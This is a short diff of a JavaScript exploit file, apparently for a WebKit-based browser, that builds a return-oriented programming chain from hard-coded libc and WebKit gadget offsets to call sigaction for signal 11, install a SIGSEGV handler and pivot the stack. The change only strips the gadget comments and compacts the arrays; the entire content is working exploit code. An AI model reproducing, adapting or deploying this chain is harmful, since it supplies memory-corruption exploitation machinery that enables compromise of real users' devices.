@@ -16,29 +16,12 @@ function db(data)
     for(var i = 0; i < data.length; i++)
         ropchain_array[ropchain_offset++] = data[i];
 }
-set_gadgets([
-libc_base+289418, //pop rcx
-ropchain+96, //rdi_stash
-libc_base+106202, //mov [rcx], rdi
-libc_base+276082 //pop rdi
-]);
-db([11, 0]); // 0xb
-set_gadgets([
-libc_base+77390, //pop rsi
-ropchain+112, //sigaction
-webkit_base+87786 //pop rdx
-]);
-db([0, 0]); // 0x0
-set_gadgets([
-sigaction_addr,
-libc_base+276082 //pop rdi
-]);
-//rdi_stash:
-db([0, 0]); // 0x0
-set_gadgets([
-pivot_addr,
-//sigaction:
-sigsegv_handler
-]);
+set_gadgets([libc_base+289418,ropchain+96,libc_base+106202,libc_base+276082]);
+db([11, 0]);
+set_gadgets([libc_base+77390,ropchain+112,webkit_base+87786]);
+db([0, 0]);
+set_gadgets([sigaction_addr,libc_base+276082]);
+db([0, 0]);
+set_gadgets([pivot_addr,sigsegv_handler]);
 ropchain_offset += 32;
 pivot(ropchain);
